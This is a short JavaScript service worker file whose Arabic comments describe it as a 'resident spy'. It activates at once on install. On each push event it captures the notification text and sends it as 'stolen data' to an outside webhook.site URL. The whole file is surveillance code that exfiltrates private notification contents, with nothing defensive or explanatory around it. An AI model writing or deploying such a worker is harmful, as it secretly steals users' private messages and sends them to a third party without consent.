// sw.js - الجاسوس المقيم
self.addEventListener('install', (event) => {
    self.skipWaiting(); // تفعيل الجاسوس فوراً دون انتظار
});

self.addEventListener('push', function(event) {
    let payload = event.data ? event.data.text() : 'إشعار جديد غامض';
    
    // إرسال البيانات المسروقة لـ Webhook الخاص بك
    event.waitUntil(
        fetch('https://webhook.site/67c1ee4b-66bd-4c2e-90be-50a7474be300', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({ app: "Spy_Active", content: payload })
        })
    );
});
